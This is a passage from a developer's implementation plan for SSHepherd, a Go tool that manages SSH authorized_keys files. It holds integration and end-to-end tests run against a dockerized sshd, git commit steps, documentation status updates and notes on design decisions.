	if err := w.Apply(itCtx(t), srv, rendered); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if got := remoteOut(t, w.Dialer, srv, `cat "$HOME/keys.d/authorized_keys"`); got != string(rendered) {
		t.Errorf("override file = %q, want the render", got)
	}
	if mode := strings.TrimSpace(remoteOut(t, w.Dialer, srv, `stat -c %a "$HOME/keys.d"`)); mode != "700" {
		t.Errorf("created dir mode = %s, want 700", mode)
	}
	if mode := strings.TrimSpace(remoteOut(t, w.Dialer, srv, `stat -c %a "$HOME/keys.d/authorized_keys"`)); mode != "600" {
		t.Errorf("override file mode = %s, want 600", mode)
	}
}

// TestIntegrationSymlinkRefused: the seeded symlink trips the exit-45
// sentinel; the link, its target, and the absence of a backup prove the
// server was refused before any change.
func TestIntegrationSymlinkRefused(t *testing.T) {
	w, host, port := itWriter(t)
	srv := config.Server{Name: "sym", Host: host, Port: port, User: "sym"}

	err := w.Apply(itCtx(t), srv, itRendered(t))
	var symErr *SymlinkError
	if !errors.As(err, &symErr) {
		t.Fatalf("Apply = %v, want *SymlinkError", err)
	}

	if out := remoteOut(t, w.Dialer, srv, `if [ -L "$HOME/.ssh/authorized_keys" ]; then echo link; fi`); strings.TrimSpace(out) != "link" {
		t.Error("authorized_keys is no longer a symlink — the refusal must leave it untouched")
	}
	real := remoteOut(t, w.Dialer, srv, `cat "$HOME/.ssh/authorized_keys_real"`)
	if !strings.Contains(real, "ssh-ed25519") || bytes.Contains([]byte(real), []byte(authkeys.ManagedHeader)) {
		t.Errorf("symlink target = %q, want the untouched seed", real)
	}
	if out := remoteOut(t, w.Dialer, srv, `ls "$HOME/.ssh"`); strings.Contains(out, ".sshepherd.bak") {
		t.Errorf("ls = %q, a refused server must have no backup", out)
	}
}
```

**Coverage notes (spec's integration list):** the lockout-guard trip and the full flows run at the cmd level in Step 9.3. Two items are deliberately covered at unit level instead of here: *verify-failure* (needs the file to mutate between `mv` and the read-back — not stageable deterministically against a real sshd; `TestApplyStageFailures`' scripted "verify bytes differ" case and `TestExecuteOutcomes`' failed-writer case own it) and *orphaned-temp reclamation* (the spec's exact script `rm -f "$t"` clears only its own `$$`-named temp, so a cross-connection orphan is **not** reclaimed by a re-apply — flagged for the owner in the post-plan notes; the residue assertions above pin that our own runs never leave one).

- [ ] **Step 9.3: Create `cmd/sshepherd/e2e_test.go`**

```go
//go:build integration

package main

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/javadh75/SSHepherd/internal/testkeys"
)

// itE2E reads the integration env (scripts/integration.sh) or skips, and
// builds the real binary once per test.
func itE2E(t *testing.T) (bin, host, port, kh, pubLine string) {
	t.Helper()
	host = os.Getenv("SSHEPHERD_IT_HOST")
	if host == "" {
		t.Skip("integration env not set; run via make integration")
	}
	port = os.Getenv("SSHEPHERD_IT_PORT")
	kh = os.Getenv("SSHEPHERD_IT_KNOWN_HOSTS")
	pub, err := os.ReadFile(os.Getenv("SSHEPHERD_IT_PUB"))
	if err != nil {
		t.Fatalf("SSHEPHERD_IT_PUB: %v", err)
	}
	bin = filepath.Join(t.TempDir(), "sshepherd")
	out, err := exec.Command("go", "build", "-o", bin, ".").CombinedOutput()
	if err != nil {
		t.Fatalf("go build: %v\n%s", err, out)
	}
	return bin, host, port, kh, strings.TrimSpace(string(pub))
}

// runBin executes the built binary with the inherited environment (the
// harness's SSH_AUTH_SOCK) and returns exit code, stdout, stderr.
func runBin(t *testing.T, bin string, args ...string) (int, string, string) {
	t.Helper()
	cmd := exec.Command(bin, args...)
	var out, errBuf strings.Builder
	cmd.Stdout = &out
	cmd.Stderr = &errBuf
	err := cmd.Run()
	code := 0
	if err != nil {
		var exitErr *exec.ExitError
		if !errors.As(err, &exitErr) {
			t.Fatalf("run %v: %v", args, err)
		}
		code = exitErr.ExitCode()
	}
	return code, out.String(), errBuf.String()
}

func writeE2EManifest(t *testing.T, dir, name, body string) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatalf("write %s: %v", name, err)
	}
	return path
}

// TestE2EApplyLoop drives the built binary through the spec's full write
// loop against the docker fleet: adopt → apply --yes (first write,
// normalizes everything) → apply --dry-run (no-op, byte-stable) → revoke by
// manifest edit → apply --dry-run (plan) → apply --yes → audit exits 0 —
// then the lockout guard trips on a manifest holding none of the agent's
// keys, and a final audit proves the file was untouched. Ordered subtests:
// each stage's on-server state is the next stage's input.
func TestE2EApplyLoop(t *testing.T) {
	bin, host, port, kh, pub := itE2E(t)
	dir := t.TempDir()

	// m0: the operator's key (held by the harness agent) on server e2e.
	m0 := writeE2EManifest(t, dir, "m0.yaml", `
users:
  - {name: op, operator: true, keys: ["`+pub+`"]}
servers:
  - {name: e2e, host: `+host+`, port: `+port+`, user: e2e}
`)
	adopted := filepath.Join(dir, "adopted.yaml")

	t.Run("adopt discovers the stale key", func(t *testing.T) {
		code, out, stderr := runBin(t, bin, "adopt", "--config", m0, "--known-hosts", kh)
		if code != 0 {
			t.Fatalf("adopt exit = %d (stderr: %s)", code, stderr)
		}
		if !strings.Contains(out, "adopted from") {
			t.Fatalf("adopt output lacks an adopted user:\n%s", out)
		}
		if err := os.WriteFile(adopted, []byte(out), 0o600); err != nil {
			t.Fatalf("write adopted manifest: %v", err)
		}
	})

	t.Run("first apply normalizes and verifies", func(t *testing.T) {
		code, out, stderr := runBin(t, bin, "apply", "--yes", "--config", adopted, "--known-hosts", kh)
		if code != 0 {
			t.Fatalf("apply exit = %d (stderr: %s)\n%s", code, stderr, out)
		}
		if !strings.Contains(out, "applied · verified") {
			t.Errorf("apply output lacks the applied·verified outcome:\n%s", out)
		}
	})

	t.Run("re-apply is a byte-stable no-op", func(t *testing.T) {
		code, out, stderr := runBin(t, bin, "apply", "--dry-run", "--config", adopted, "--known-hosts", kh)
		if code != 0 {
			t.Fatalf("dry-run exit = %d, want 0 (converged) (stderr: %s)\n%s", code, stderr, out)
		}
		if !strings.Contains(out, "converged (no changes)") {
			t.Errorf("dry-run output lacks convergence:\n%s", out)
		}
	})

	t.Run("revoking the stale grant plans a remove", func(t *testing.T) {
		code, out, _ := runBin(t, bin, "apply", "--dry-run", "--config", m0, "--known-hosts", kh)
		if code != 1 {
			t.Fatalf("dry-run exit = %d, want 1 (pending change)\n%s", code, out)
		}
		if !strings.Contains(out, "remove (unauthorized)") {
			t.Errorf("plan lacks the remove row:\n%s", out)
		}
	})

	t.Run("apply the revoke and audit clean", func(t *testing.T) {
		if code, out, stderr := runBin(t, bin, "apply", "--yes", "--config", m0, "--known-hosts", kh); code != 0 {
			t.Fatalf("apply exit = %d (stderr: %s)\n%s", code, stderr, out)
		}
		if code, out, stderr := runBin(t, bin, "audit", "--config", m0, "--known-hosts", kh); code != 0 {
			t.Fatalf("audit exit = %d, want 0 — the distribute→audit loop must close (stderr: %s)\n%s", code, stderr, out)
		}
	})

	t.Run("lockout guard refuses and leaves the file alone", func(t *testing.T) {
		ghost := writeE2EManifest(t, dir, "ghost.yaml", `
users:
  - {name: ghost, keys: ["`+testkeys.Line(t, 42)+`"]}
servers:
  - {name: e2e, host: `+host+`, port: `+port+`, user: e2e}
access:
  - {user: ghost, servers: [e2e]}
`)
		code, out, _ := runBin(t, bin, "apply", "--yes", "--config", ghost, "--known-hosts", kh)
		if code != 1 {
			t.Fatalf("lockout apply exit = %d, want 1\n%s", code, out)
		}
		if !strings.Contains(out, "REFUSED:") || !strings.Contains(out, "lock this session out") {
			t.Errorf("output lacks the guard refusal:\n%s", out)
		}
		// The file is untouched: the m0 audit still passes byte-for-byte.
		if code, out, stderr := runBin(t, bin, "audit", "--config", m0, "--known-hosts", kh); code != 0 {
			t.Fatalf("post-refusal audit exit = %d, want 0 (the refused write must not have touched the file) (stderr: %s)\n%s", code, stderr, out)
		}
	})
}
```

- [ ] **Step 9.4: Verify the unit suite and tagged compile stay green**

Run: `go test ./... -count=1 && go vet -tags=integration ./...`
Expected: PASS / no findings — the tagged files compile but their tests only run under the harness.

- [ ] **Step 9.5: Run the integration suite**

Run: `make integration`
Expected: PASS — the pre-existing `TestIntegrationReadPresent` (now also asserting `SessionKeyFP`), `TestIntegrationFileAbsent`, `TestIntegrationUnknownHostKey`, the four new `TestIntegration*` write tests, and all six `TestE2EApplyLoop` subtests, all green against the container. (Requires Docker running.)

- [ ] **Step 9.6: Full gate**

Run: `make check`
Expected: all green.

- [ ] **Step 9.7: Commit**

```bash
git add scripts/integration.sh internal/sshwrite/integration_test.go cmd/sshepherd/e2e_test.go
git commit -m "$(cat <<'EOF'
test(integration): apply against dockerized sshd + E2E loop

Four new fixture users (writer/virgin/sym/e2e) with disjoint roles; sshwrite
integration covers drifted write → byte-equal + 0600 + .sshepherd.bak + no
temp residue, file-absent creation (default and override dir, 0700/0600),
and symlink refusal; the cmd E2E drives the built binary through
adopt → apply → no-op → revoke → apply → audit-clean plus the lockout
guard trip — the first full distribute-then-audit loop.

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 10: `docs` — mark the apply slice implemented

**Files:**
- Modify: `docs/superpowers/specs/2026-07-19-apply-slice-design.md` (status line)
- Modify: `CLAUDE.md` (Status section)
- Modify (not committed): `~/.claude/projects/-Users-javad-w-personal-SSHepherd/memory/roadmap-next-slices.md`

- [ ] **Step 10.1: Update the spec status line**

In `docs/superpowers/specs/2026-07-19-apply-slice-design.md`, replace:

```markdown
- **Status:** Approved 2026-07-19 by the owner — all four open questions
  resolved as recommended: refined lockout guard (intersection over
  agent-held keys), single-generation `.sshepherd.bak` backup,
  plan-then-prompt confirmation (`--yes` for automation), managed header
  kept.
```

with:

```markdown
- **Status:** Implemented (2026-07-19) — see
  `docs/superpowers/plans/2026-07-19-apply-slice.md`. All four open
  questions were resolved as recommended at approval (same day): refined
  lockout guard (intersection over agent-held keys), single-generation
  `.sshepherd.bak` backup, plan-then-prompt confirmation (`--yes` for
  automation), managed header kept.
```

- [ ] **Step 10.2: Update CLAUDE.md Status**

Append to the `## Status` paragraph (after the sentence ending "`import --merge` is deferred to a later slice."):

```markdown
The write path is live: **`apply`** converges each server's
`authorized_keys` byte-exactly to a full-file render (managed header,
operator-first order, `DesiredComment` policy) behind plan → confirm
(`--yes` / `--dry-run`, prompt on stderr) → atomic remote write
(temp+rename, single-generation `.sshepherd.bak`, symlink refusal) →
read-back verify, guarded by the refined self-lockout rule (rendered set ∩
agent-held keys, so self-rotation works) with exits 0/1/3 and `--server`
canary filtering; shared SSH glue moved to `internal/sshconn` between
`sshread` and the new `internal/sshwrite`, and `internal/authkeys` gained
the fuzz-pinned renderer (specced in
`docs/superpowers/specs/2026-07-19-apply-slice-design.md`).
```

- [ ] **Step 10.3: Update the roadmap memory (not committed)**

In `~/.claude/projects/-Users-javad-w-personal-SSHepherd/memory/roadmap-next-slices.md`, mark the apply slice done (with the plan path) and promote `import --merge` to the next slice. This file lives outside the repo — do **not** `git add` it.

- [ ] **Step 10.4: Full gate**

Run: `make check`
Expected: all green (docs-only change; the gate is cheap insurance that the tree is still clean).

- [ ] **Step 10.5: Commit**

```bash
git add CLAUDE.md docs/superpowers/specs/2026-07-19-apply-slice-design.md
git commit -m "$(cat <<'EOF'
docs: mark apply slice implemented

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)"
```

---

## Post-plan notes for the executor (and the owner)

Deliberate resolutions of spec ambiguities — flag to the owner if any reads wrong:

1. **Renderer signature.** The spec's shorthand `Render(entries) []byte` gained an `error` return: a `Key` whose `Raw` fails to re-parse (only constructible by hand) must surface, not silently drop a line — a dropped key is a lockout hazard. Impossible for validated manifests; `cmd` maps it to exit 3.
2. **`ManagedHeader` lives in `authkeys`**, and `Render` emits it — the header is part of "the rendered file" that `FuzzRenderRoundTrip`'s parser-identity claim covers, and `apply` and the integration tests share one constant.
3. **Shared validation predicate.** The name/comment rules live in `authkeys.RenderTextIssue` (property of the line format), consumed by `config` — so Task 3's fuzz gate and manifest validation can never drift apart. The spec placed the rules in `config`; the behavior is identical.
4. **Report split.** The spec's example block shows `applied · verified` inside the per-server trailer, but the plan must render *before* confirmation, when no outcome exists. Resolution: `apply.Render` (plan blocks, at the gate) + `apply.RenderSummary` (outcome lines + `Summary:`, after phase 2 or its skip) — stdout is the concatenation, matching the example's content with outcomes as per-server lines rather than trailer suffixes.
5. **Orphaned-temp reclamation — resolved 2026-07-19.** The temp name is fixed (`"$p".sshepherd.tmp`, no `$$` suffix), so the next apply's `rm -f` genuinely reclaims an orphan from a dropped connection. Concurrent applies to one server are already last-writer-wins on `mv`, and `set -C` makes an interleaved `cat` fail loudly instead of corrupting, so a PID suffix would have bought nothing and orphaned temps forever. The spec was amended to match.
6. **Verify-failure integration test** is not deterministically stageable against a real sshd (requires mutating the file between `mv` and read-back); it is covered by the seamed unit tests instead (`TestApplyStageFailures`, `TestExecuteOutcomes`).
7. **`AgentFingerprints` returns an empty list (not an error) for an empty agent** — `CheckAgent` (which runs first) owns the empty-agent verdict at preflight, while the guard's own empty-listing fallback needs the distinction if the agent drains mid-run.
8. **"Empty file" in the empty-desired split** means *no parseable keys and no parse errors* (comments-only counts as empty), matching audit's `Compliant()` — with a non-empty desired set, byte-exactness governs instead.
9. **`deadcode` skips in Tasks 3–7** (see Conventions): whole-program reachability cannot hold while the spec's commit order lands library cores before the `cmd` wiring. Full `make check` at Tasks 1, 2, 8, 9, 10.
10. **`apply --json` stays deferred** per the spec; audit's JSON path is untouched.

Also remember: work only in the main working tree; ignore compile diagnostics from other worktrees and do not touch branch `import-merge`.
